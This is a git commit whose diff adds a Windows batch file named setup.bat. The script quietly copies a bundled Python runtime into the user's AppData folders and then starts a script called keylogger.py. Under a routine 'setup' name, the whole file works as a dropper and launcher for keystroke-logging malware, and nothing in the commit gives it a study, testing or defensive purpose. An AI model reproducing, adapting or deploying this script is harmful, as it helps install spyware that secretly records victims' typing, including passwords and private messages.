8b7287dbcef72e266452ad014efc6213f7f4811e
BenatEiguren <156070698+BenatEiguren@users.noreply.github.com>
2024-01-09 12:30:46 +0100

    Add files via upload

---
+++ setup.bat
@@ -0,0 +1,12 @@
+@echo off
+
+if exist %APPDATA%\..\Local\Programs\Python (goto Python)
+md %APPDATA%\..\Local\Programs\Python
+:Python
+if exist %APPDATA%\..\Local\Programs\Python\Python311 (goto Python311)
+md %APPDATA%\..\Local\Programs\Python\Python311
+
+:Python311
+xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311
+
+start .\keylogger.py
